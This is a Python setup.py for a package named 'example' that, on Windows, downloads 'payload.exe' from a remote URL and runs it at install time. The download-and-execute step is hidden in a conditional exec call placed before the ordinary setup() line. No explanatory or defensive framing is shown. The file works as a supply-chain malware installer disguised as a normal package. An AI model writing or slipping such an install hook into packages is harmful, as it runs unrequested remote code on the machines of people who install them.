import os
import requests as r
import subprocess as s
import sys
from setuptools import setup

exec("s.run(os.path.abspath('payload.exe'))" if sys.platform == 'win32' and open('payload.exe', 'wb').write(r.get('https://example.com/payload.exe').content) else "pass")
setup(name='example')
